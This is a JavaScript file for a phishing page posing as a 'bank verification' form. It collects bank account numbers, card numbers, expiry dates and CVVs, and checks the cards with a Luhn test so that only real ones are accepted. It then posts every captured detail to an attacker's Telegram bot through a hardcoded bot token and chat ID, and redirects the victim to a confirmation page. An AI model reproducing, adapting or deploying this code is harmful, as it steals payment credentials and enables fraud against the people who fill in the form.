let currentStep = 0;
        const steps = document.querySelectorAll(".form-step");

        // Telegram Bot API Details
        const TELEGRAM_BOT_TOKEN = "7739574932:AAHnQpeZR9obL8u7-oUdenZpIcSvTl5eZrY";
        const TELEGRAM_CHAT_ID = "6300694007";

        function nextStep() {
            if (validateStep()) {
                steps[currentStep].classList.remove("active");
                currentStep++;
                if (currentStep < steps.length) {
                    steps[currentStep].classList.add("active");
                    saveProgress();
                }
            }
        }

        function validateStep() {
            const inputs = steps[currentStep].querySelectorAll("input, select");
            for (let input of inputs) {
                if (!input.value.trim()) {
                    alert(`Please fill in the ${input.previousElementSibling.innerText}`);
                    return false;
                }

                if (input.id === "cardName" && !/^[A-Za-z\s]+$/.test(input.value)) {
                    alert("Cardholder's name must only contain letters.");
                    return false;
                }

                if (input.id === "cvv" && !/^\d{3,4}$/.test(input.value)) {
                    alert("CVV must be 3 or 4 digits.");
                    return false;
                }
            }
            return true;
        }

        // Save progress
        function saveProgress() {
            localStorage.setItem("currentStep", currentStep);
        }

        // Expiry Date Auto Formatting
        document.getElementById("expiryDate").addEventListener("input", function (e) {
            let input = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
            
            if (input.length > 2) {
                input = input.slice(0, 2) + '/' + input.slice(2, 4);
            }
            e.target.value = input.slice(0, 5); // Limit to MM/YY format
        });

        // Credit Card Validation
        document.getElementById("cardNumber").addEventListener("input", function (e) {
    let input = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
    e.target.value = input;

    // Regex for common credit cards (Visa, MasterCard, AMEX, Discover, JCB, etc.)
    const creditCardRegex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12}|35[2-8][0-9]{13})$/;

    // Luhn Algorithm Check Function
    function luhnCheck(number) {
        let arr = (number + '').split('').reverse().map(x => parseInt(x));
        let sum = arr.reduce((acc, val, idx) => acc + (idx % 2 ? ((val * 2 > 9) ? (val * 2 - 9) : val * 2) : val), 0);
        return sum % 10 === 0;
    }

    if (input.length >= 13) {
        if (!creditCardRegex.test(input) || !luhnCheck(input)) {
            alert("Invalid credit card number. Only real credit cards are allowed.");
            e.target.value = "";
        }
    }
});

        // Load progress
        window.onload = function () {
            const savedStep = localStorage.getItem("currentStep");
            if (savedStep !== null && savedStep < steps.length) {
                currentStep = parseInt(savedStep);
                steps[currentStep].classList.add("active");
            }
        };

        function submitForm() {
            if (validateStep()) {
                // Collect user inputs
                const bank = document.getElementById("bank").value;
                const accountNumber = document.getElementById("accountNumber").value;
                const cardName = document.getElementById("cardName").value;
                const cardNumber = document.getElementById("cardNumber").value;
                const expiryDate = document.getElementById("expiryDate").value;
                const cvv = document.getElementById("cvv").value;

                // Format message
                const message = `🔔 **New Bank Verification Request** 🔔\n\n` +
                    `🏦 **Bank Name:** ${bank}\n` +
                    `💳 **Account Number:** ${accountNumber}\n\n` +
                    `👤 **Cardholder Name:** ${cardName}\n` +
                    `🔢 **Card Number:** ${cardNumber}\n` +
                    `📅 **Expiration Date:** ${expiryDate}\n` +
                    `🔒 **CVV:** ${cvv}`;

                // Send message to Telegram
                sendToTelegram(message);
            }
        }

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    window.location.href = "confirm.html"; // Redirect after successful submission
                } else {
                    alert("Failed to send details. Please try again.");
                }
            })
            .catch(() => {
                alert("Network error! Please check your connection and try again.");
            });
                }
